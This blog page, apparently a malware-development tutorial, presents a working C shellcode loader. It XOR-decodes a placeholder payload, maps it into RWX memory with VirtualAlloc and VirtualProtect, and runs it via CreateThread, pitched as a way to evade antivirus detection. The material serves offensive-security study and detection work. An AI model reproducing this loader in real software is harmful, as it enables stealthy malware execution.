<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Payload Execution - pwn3rx0</title>
  <meta name="description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="keywords" content="malware-development, shellcode, evasion, win-api, memory-management, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev, execution">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Execution/Local Payload Execution/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="Local Payload Execution">
  <meta property="og:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Execution/Local Payload Execution/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Local Payload Execution">
  <meta name="twitter:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Execution/">Execution</a>
    
      <span class="separator">/</span>
      <span class="current">Local Payload Execution</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>Local Payload Execution</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">shellcode</span><span class="tag">evasion</span><span class="tag">win-api</span><span class="tag">memory-management</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><p>is a technique used to run a binary payload (often shellcode) directly within the memory space of a process on a local machine. This method is common in offensive security for executing code without writing it to disk, reducing the chance of detection by antivirus or endpoint protection solutions.</p>
<hr>
<h2>Code Example: Local Payload Execution in C</h2>
<pre><code class="language-c">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

// Function to decode or prepare shellcode (details abstracted here)
BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt;= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
    return TRUE;
}

unsigned char XorKey[] = { /* key bytes */ };

int main() {
    unsigned char cipherText[] = { /* encrypted payload bytes */ };
    SIZE_T sDSize = sizeof(cipherText);

    // Step 1: Decode payload
    if (!XorByInputKey(cipherText, sDSize, XorKey, sizeof(XorKey))) {
        return -1;
    }

    // Step 2: Allocate memory for payload
    PVOID pShellCodeAddres = VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pShellCodeAddres) {
        return -1;
    }

    // Step 3: Copy payload to allocated memory
    memcpy(pShellCodeAddres, cipherText, sDSize);
    memset(cipherText, &#39;\0&#39;, sDSize);  // Clear original buffer

    // Change memory protection to executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(pShellCodeAddres, sDSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Step 4: Execute payload in a new thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellCodeAddres, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Wait for payload execution to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Step 5: Free allocated memory
    VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);

    return 0;
}
</code></pre>
<h2>Key Steps in Local Payload Execution</h2>
<h3>1. Preparation of Payload</h3>
<ul>
<li>The payload is stored in memory, often in an encoded or obfuscated form.</li>
<li>It must be decoded or decrypted in-memory before execution (this step is necessary but secondary to execution itself).</li>
</ul>
<h3>2. Memory Allocation</h3>
<ul>
<li>The Windows API function <code>VirtualAlloc</code> is used to allocate memory with specific flags.<ul>
<li><code>MEM_COMMIT | MEM_RESERVE</code>: Reserves and commits memory.</li>
<li><code>PAGE_READWRITE</code>: Allows the memory to be written to initially.</li>
</ul>
</li>
<li>The allocated memory must be large enough to hold the entire payload.</li>
</ul>
<h3>3. Copying Payload to Executable Memory</h3>
<ul>
<li>The decoded payload is copied into the allocated memory.</li>
<li>After copying, the memory protection is changed using <code>VirtualProtect</code> to:<ul>
<li><code>PAGE_EXECUTE_READWRITE</code>: Allows the payload to be executed from this memory region.</li>
</ul>
</li>
<li>Changing memory permissions is crucial since many systems mark writable memory as non-executable by default to prevent code injection attacks.</li>
</ul>
<h3>4. Executing the Payload</h3>
<ul>
<li>A new thread is created using <code>CreateThread</code>, with the starting routine set to the address of the allocated memory containing the payload.</li>
<li>This allows the payload to run asynchronously within the same process.</li>
<li>The main thread waits for the payload thread to finish execution using <code>WaitForSingleObject</code>.</li>
</ul>
<h3>5. Cleanup</h3>
<ul>
<li>After execution, allocated memory is freed using <code>VirtualFree</code>.</li>
<li>Sensitive data buffers are cleared (e.g., zeroing the payload buffer) to minimize traces in memory.</li>
</ul>
<hr>
</div>
        <nav class="post-navigation">
          <span class="nav-link disabled"><span class="nav-direction">← Previous</span><span class="nav-title">No older post</span></span>
          
      <a href="/writeups/Malware DEV/Execution/APC Injection/" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">APC Injection</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Obfuscation/To IPs/">IPv4 Masquerading (Obfuscation)</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing/">HTTP Stager & Remote Payload Delivery</a></li><li><a href="/writeups/Malware DEV/Encryption/Encryption/">Shellcode Obfuscation & Encryption</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>(function(){function _0x53d77a(_0x12e5ab){const _0x32ebda=_0x12e5ab||document['querySelector']('.writeup-content')||document,_0x42e968=Array['from'](_0x32ebda['querySelectorAll']('pre\x20>\x20code'))['filter'](_0x1107b6=>!_0x1107b6['closest']('.code-block'));_0x42e968['forEach'](_0x3d8801=>{const _0x1df645=_0x3d8801['parentElement'];if(!_0x1df645||_0x1df645['dataset']['enhanced']==='true')return;_0x1df645['dataset']['enhanced']='true';let _0x7da17b=Array['from'](_0x3d8801['classList']||[])['find'](_0x5d2a47=>_0x5d2a47['startsWith']('language-'));if(!_0x7da17b){const _0x21bf28=_0x3d8801['textContent']||'';(/#include\s+<[^>]+>/['test'](_0x21bf28)||/\bint\s+main\s*\(/['test'](_0x21bf28)||/#include\s+<Windows\.h>/i['test'](_0x21bf28))&&(_0x3d8801['classList']['add']('language-c'),_0x7da17b='language-c');}const _0x8b42e4=(_0x7da17b?_0x7da17b['replace']('language-',''):'text')['toUpperCase'](),_0x19272e=document['createElement']('div');_0x19272e['className']='code-block';const _0x18598c=document['createElement']('div');_0x18598c['className']='code-header';const _0x2240ca=document['createElement']('span');_0x2240ca['className']='code-lang',_0x2240ca['textContent']=_0x8b42e4;const _0xf1f322=document['createElement']('button');_0xf1f322['className']='code-copy',_0xf1f322['type']='button',_0xf1f322['textContent']='Copy',_0xf1f322['addEventListener']('click',async()=>{const _0x44b594=_0x3d8801['innerText'],_0x281e48=()=>{const _0x4bedda=document['createElement']('textarea');_0x4bedda['value']=_0x44b594,_0x4bedda['style']['position']='fixed',_0x4bedda['style']['opacity']='0',_0x4bedda['style']['left']='-9999px',document['body']['appendChild'](_0x4bedda),_0x4bedda['focus'](),_0x4bedda['select']();try{document['execCommand']('copy'),_0xf1f322['textContent']='Copied';}catch(_0x5e06af){_0xf1f322['textContent']='Failed';}finally{document['body']['removeChild'](_0x4bedda),setTimeout(()=>_0xf1f322['textContent']='Copy',0x4b0);}};try{navigator['clipboard']&&window['isSecureContext']?(await navigator['clipboard']['writeText'](_0x44b594),_0xf1f322['textContent']='Copied',setTimeout(()=>_0xf1f322['textContent']='Copy',0x4b0)):_0x281e48();}catch(_0xe1b03e){_0x281e48();}}),_0x18598c['appendChild'](_0x2240ca),_0x18598c['appendChild'](_0xf1f322);const _0x4439ed=document['createElement']('div');_0x4439ed['className']='code-content',_0x1df645['replaceWith'](_0x19272e),_0x4439ed['appendChild'](_0x1df645),_0x19272e['appendChild'](_0x18598c),_0x19272e['appendChild'](_0x4439ed);if(window['hljs']&&typeof window['hljs']['highlightElement']==='function')window['hljs']['highlightElement'](_0x3d8801);else window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});}function _0x1a087b(_0x317738){const _0x442da7=_0x317738||document['querySelector']('.writeup-content');if(!_0x442da7)return;const _0x16fba0=_0x442da7['querySelectorAll']('h1,h2,h3,h4,h5,h6');_0x16fba0['forEach'](_0x1c70c7=>{const _0x3c85d8=parseInt(_0x1c70c7['tagName']['substring'](0x1),0xa);let _0x50cc91=_0x1c70c7['nextElementSibling'];while(_0x50cc91){if(/^H[1-6]$/['test'](_0x50cc91['tagName'])){const _0x7a14ee=parseInt(_0x50cc91['tagName']['substring'](0x1),0xa);if(_0x7a14ee<=_0x3c85d8)break;}_0x50cc91['tagName']==='P'&&_0x50cc91['classList']['add']('indent-p'),_0x50cc91=_0x50cc91['nextElementSibling'];}});}function _0x2b55cb(){window['mermaid']&&mermaid['initialize']({'startOnLoad':!![],'theme':'dark'});_0x53d77a(),_0x1a087b();window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();const _0xaf932=document['querySelector']('.writeup-content');if(_0xaf932&&window['MutationObserver']){const _0x3d6341=new MutationObserver(()=>{_0x53d77a(_0xaf932),_0x1a087b(_0xaf932),window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});_0x3d6341['observe'](_0xaf932,{'childList':!![],'subtree':!![]});}}window['addEventListener']('load',_0x2b55cb);}());</script>
</body>
</html>
